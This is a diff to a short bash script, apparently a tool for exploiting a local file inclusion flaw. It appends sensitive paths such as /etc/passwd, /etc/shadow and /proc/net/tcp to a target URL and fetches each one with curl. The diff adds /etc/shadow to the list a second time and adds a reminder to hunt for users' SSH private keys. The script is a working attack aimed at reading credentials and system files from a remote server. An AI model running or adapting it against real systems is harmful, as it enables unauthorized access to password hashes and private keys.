@@ -8,12 +8,13 @@ echo "---Enum Common Filenames"
 #URL input as commandline Argument
 url="$1"
 
-files=("/etc/passwd" "/etc/crontab" "/proc/mounts" "/etc/issue" "/proc/version" "/etc/resolv.conf" "/etc/hostname" "/etc/anacrontab" "/etc/shadow" "/proc/net/tcp")
+files=("/etc/passwd" "/etc/crontab" "/proc/mounts" "/etc/issue" "/proc/version" "/etc/resolv.conf" "/etc/hostname" "/etc/anacrontab" "/etc/shadow" "/proc/net/tcp" "/etc/shadow")
 for filename in ${files[@]};do
   echo "----$filename----"
   curl --silent "$url$filename" 
   echo
 done
+echo "---Manually: look in the home folder for SSH keys /home/user/.ssh/id_rsa   /home/user/.ssh/id_ed25519"
 
 echo "---Enum Network Info"
 
